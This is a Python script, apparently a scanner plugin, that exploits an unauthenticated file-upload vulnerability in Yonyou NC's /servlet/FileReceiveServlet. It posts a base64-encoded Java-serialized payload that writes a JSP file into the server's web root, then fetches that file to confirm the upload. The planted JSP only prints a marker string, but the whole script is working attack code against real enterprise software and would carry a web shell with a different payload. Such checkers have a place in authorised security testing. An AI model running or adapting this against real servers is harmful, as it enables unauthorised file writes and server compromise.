import requests
import urllib, re, base64

def verify(url):
    relsult = {
        'name': '用友 NC >6.5 未授权文件上传漏洞(/servlet/FileReceiveServlet)',
        'vulnerable': False,
        'url': url,
        'attack': True,
        'about': 'https://blog.csdn.net/weixin_44578334/article/details/110917053',
    }
    timeout = 20
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Content-Type": "multipart/form-data;",
        "Referer": "https://google.com"
    }
    vurl = urllib.parse.urljoin(url, '/servlet/FileReceiveServlet')
    verify_url = urllib.parse.urljoin(url, '/bd3bd.jsp')
    # shell:      <%out.print("9uY193ZWJ4PCVvdXQucHJpbnQoImFiY2RlZ");%>
    # filename:   bd3bd.jsp
    data = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAJRklMRV9OQU1FdAAJYmQzYmQuanNwdAAQVEFSR0VUX0ZJTEVfUEFUSHQAEC4vd2ViYXBwcy9uY193ZWJ4PCVvdXQucHJpbnQoIjl1WTE5M1pXSjRQQ1Z2ZFhRdWNISnBiblFvSW1GaVkyUmxaIik7JT4="
    try:
        rep = requests.get(url, headers=headers, verify=False, timeout=timeout)
        if rep.status_code == 200:
            rep2 = requests.post(vurl, headers=headers, verify=False, timeout=timeout, data=base64.b64decode(data))
            if rep2.status_code == 200:
                verify_rep = requests.get(verify_url, headers=headers, verify=False, timeout=timeout)
                if verify_rep.status_code == 200 and re.search("9uY193ZWJ4PCVvdXQucHJpbnQoImFiY2RlZ", verify_rep.text):
                    relsult['vulnerable'] = True
                    relsult['verify'] = verify_url
        return relsult
    except:
        return relsult